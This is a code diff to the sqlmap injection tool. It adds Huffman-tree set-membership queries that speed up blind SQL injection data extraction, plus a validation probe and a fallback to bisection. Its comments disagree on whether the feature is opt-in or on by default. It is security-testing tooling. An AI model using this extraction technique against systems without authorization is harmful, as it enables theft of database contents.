@@ -7,6 +7,7 @@ See the file 'LICENSE' for copying permission
 
 from __future__ import division
 
+import heapq
 import re
 import time
 
@@ -41,6 +42,7 @@ from lib.core.enums import PAYLOAD
 from lib.core.exception import SqlmapThreadException
 from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.settings import CHAR_INFERENCE_MARK
+from lib.core.settings import HUFFMAN_PROBE_LIMIT
 from lib.core.settings import INFERENCE_BLANK_BREAK
 from lib.core.settings import INFERENCE_EQUALS_CHAR
 from lib.core.settings import INFERENCE_GREATER_CHAR
@@ -63,6 +65,10 @@ from lib.utils.progress import ProgressBar
 from lib.utils.safe2bin import safecharencode
 from lib.utils.xrange import xrange
 from thirdparty import six
+
+# Sentinel returned by the opt-in Huffman retrieval (--huffman) meaning "this character is
+# outside the ASCII model (e.g. multi-byte/Unicode) - defer to the classic bisection".
+_HUFFMAN_FALLBACK = object()
 
 def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
     """
@@ -270,6 +276,95 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             return result
 
+        def huffmanChar(idx):
+            """
+            Adaptive retrieval of a single character using set-membership ("... IN (...)")
+            questions driven by a Huffman tree built from an online frequency model of the data
+            retrieved so far (used by default for blind table dumps; '--no-huffman' disables it).
+            The expected number of requests approaches the
+            data's entropy (fewer on text/hex), while uniform/binary data yields a balanced tree
+            (i.e. no penalty versus the classic bisection).
+
+            Correctness does NOT depend on the (shared, racily updated) model: the tree is a
+            decision tree over the whole 0..127 range plus a dedicated ESCAPE leaf. At every node
+            the child that does NOT contain ESCAPE is the one tested, so any value outside 0..127
+            (e.g. multi-byte/Unicode) fails every membership test, lands on ESCAPE and is handed
+            back to the classic bisection. Returns the character, or None to fall back.
+            """
+            ESCAPE = -1
+            model = kb.huffmanModel
+
+            heap = []
+            for order, ordinal in enumerate(xrange(128)):
+                heapq.heappush(heap, (model.get(ordinal, 0) + 1, order, (ordinal,)))
+            heapq.heappush(heap, (max(model.get(ESCAPE, 0), 1), 128, (ESCAPE,)))
+
+            counter = 129
+            while len(heap) > 1:
+                w1, _, n1 = heapq.heappop(heap)
+                w2, _, n2 = heapq.heappop(heap)
+                heapq.heappush(heap, (w1 + w2, counter, (n1, n2)))
+                counter += 1
+            node = heap[0][2]
+
+            def _concrete(n):
+                if len(n) == 1:
+                    return [] if n[0] == ESCAPE else [n[0]]
+                return _concrete(n[0]) + _concrete(n[1])
+
+            def _hasEscape(n):
+                return n[0] == ESCAPE if len(n) == 1 else (_hasEscape(n[0]) or _hasEscape(n[1]))
+
+            template = payload.replace("%s%s" % (INFERENCE_GREATER_CHAR, "%d"), " IN (%s)", 1)
+
+            while len(node) == 2:
+                left, right = node
+
+                if _hasEscape(left):
+                    testNode, otherNode = right, left
+                elif _hasEscape(right):
+                    testNode, otherNode = left, right
+                else:
+                    leftLeaves, rightLeaves = _concrete(left), _concrete(right)
+                    testNode, otherNode = (left, right) if len(leftLeaves) <= len(rightLeaves) else (right, left)
+
+                testSet = _concrete(testNode)
+                setExpr = ','.join(str(_) for _ in testSet)
+                forgedPayload = safeStringFormat(template, (expressionUnescaped, idx, setExpr))
+                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
+                incrementCounter(getTechnique())
+
+                node = testNode if result else otherNode
+
+            value = node[0]
+
+            if value == ESCAPE:
+                model[ESCAPE] = model.get(ESCAPE, 0) + 1
+                return _HUFFMAN_FALLBACK
+
+            if value == 0:
+                # ORD(MID(..)) of an empty (past end-of-string) character is 0; mirror the classic
+                # bisection and signal end-of-string (do NOT pollute the model with the sentinel).
+                return None
+
+            # One-time safety validation: cross-check the first set-membership result with a short
+            # equality probe. Unlike the long IN() lists, a single '=N' comparison cannot be
+            # truncated/mangled by a parameter-length limit or a WAF, so it is a trustworthy oracle.
+            # If it disagrees, the IN() channel is unreliable here: latch the technique off so the
+            # classic '>' bisection takes over for the rest of the run (graceful fallback).
+            if not kb.huffmanValidated:
+                verifyPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, value))
+                verified = Request.queryPage(verifyPayload, timeBasedCompare=timeBasedCompare, raise404=False)
+                incrementCounter(getTechnique())
+                if verified:
+                    kb.huffmanValidated = True
+                else:
+                    kb.disableHuffman = True
+                    return _HUFFMAN_FALLBACK
+
+            model[value] = model.get(value, 0) + 1
+            return decodeIntToUnicode(value)
+
         def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None):
             """
             continuousOrder means that distance between each two neighbour's
@@ -282,6 +377,21 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             if result:
                 return result
+
+            if (not conf.noHuffman and not kb.disableHuffman and dump and continuousOrder and charsetType is None and not timeBasedCompare
+                    and ("%s%s" % (INFERENCE_GREATER_CHAR, "%d")) in payload
+                    and ("'%s'" % CHAR_INFERENCE_MARK) not in payload):
+                kb.huffmanProbes = (kb.huffmanProbes or 0) + 1
+                result = huffmanChar(idx)
+                if result is not _HUFFMAN_FALLBACK:
+                    return result
+                # huffman declined this character (Unicode/escape, or failed the validation probe).
+                # If the set-membership channel keeps escaping it is not paying off here (trimmed/
+                # blocked long payloads, or non-ASCII-heavy data) -> latch off so the classic '>'
+                # bisection takes over efficiently for the rest of the run.
+                kb.huffmanEscapes = (kb.huffmanEscapes or 0) + 1
+                if kb.huffmanProbes >= HUFFMAN_PROBE_LIMIT and kb.huffmanEscapes * 2 >= kb.huffmanProbes:
+                    kb.disableHuffman = True
 
             if charTbl is None:
                 charTbl = type(asciiTbl)(asciiTbl)
